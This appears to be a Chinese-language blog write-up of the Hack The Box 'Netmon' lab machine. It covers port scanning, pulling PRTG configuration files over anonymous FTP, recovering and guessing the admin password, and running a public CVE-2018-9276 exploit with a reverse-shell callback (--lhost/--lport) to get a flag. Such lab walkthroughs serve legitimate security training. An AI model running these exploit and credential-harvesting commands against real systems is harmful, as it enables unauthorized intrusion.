---
title: Netmon (Hack The Box Writeup)
date: 2021-09-08T14:02:00+08:00
draft: false
url: "/2021/09/08/netmon-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/Netmon
- IP : 10.129.210.193

## Recon

- Rustscan

```
Open 10.129.210.193:80
Open 10.129.210.193:135
Open 10.129.210.193:139
Open 10.129.210.193:445
Open 10.129.210.193:5985
```

- nmap![](/uploads/2022/02/2e8d4-u3hdM2g.png)
- ![](/uploads/2022/02/29500-T90oc8o.png)FTP- ![](/uploads/2022/02/30b5e-9s6meyF.png)
- ![](/uploads/2022/02/25cf0-8q3qqmk.png)Web- appVersion':'18.1.37.13946'
- ![](/uploads/2022/02/5e7d3-F8Bbaii.png)
- https://github.com/wildkindcc/CVE-2018-9276
- https://github.com/chcx/PRTG-Network-Monitor-RCE

## FTP

- ![](/uploads/2022/02/c589e-D82BbiD.png)
- ![](/uploads/2022/02/c6815-DXZXqWq.png)
- Try Exploithttps://github.com/chcx/PRTG-Network-Monitor-RCE
- ![](/uploads/2022/02/e9f44-JXCuntx.png)
- 需要登入才能用，所以我們需要找帳密QQ從官網發現 Log 跟 Config 存在 `/ProgramData/Paessler`- `wget -r ftp://10.129.210.193/ProgramData/Paessler`
- 整包載下來`grep password */* | less`- 發現 `PRTG Configuration.dat` 很可疑
- ![](/uploads/2022/02/18b98-aYorBkq.png)看到相關的檔案有以下幾個- `PRTG Configuration.old.bak`
- `PRTG Configuration.dat`
- `PRTG Configuration.old`
- `Configuration Auto-Backups/*``PRTG Configuration.old.bak` 應該最可疑- ![](/uploads/2022/02/9a503-5ElS4Za.png)
- 看到帳密`prtgadmin`
- `PrTg@dmin2018`
- 但登入失敗通靈把密碼改 `2019`- `prtgadmin`
- `PrTg@dmin2019`
- 登入成功
- ![](/uploads/2022/02/27bae-QzgPzeh.png)

## Exploit

- https://github.com/wildkindcc/CVE-2018-9276`python CVE-2018-9276.py -i 10.129.210.202 -p 80 --lhost 10.10.16.35 --lport 7877 --user prtgadmin --password PrTg@dmin2019`
- ![](/uploads/2022/02/cd3cc-50J42zh.png)確定權限- ![](/uploads/2022/02/c96f0-abehEpS.png)取得 Flag- ![](/uploads/2022/02/39f9a-k4rFH3h.png)

## 學到了

- FTP 記得 ls -al 避免隱藏檔案
- 密碼可以試試看猜規則 QQ年分之類的
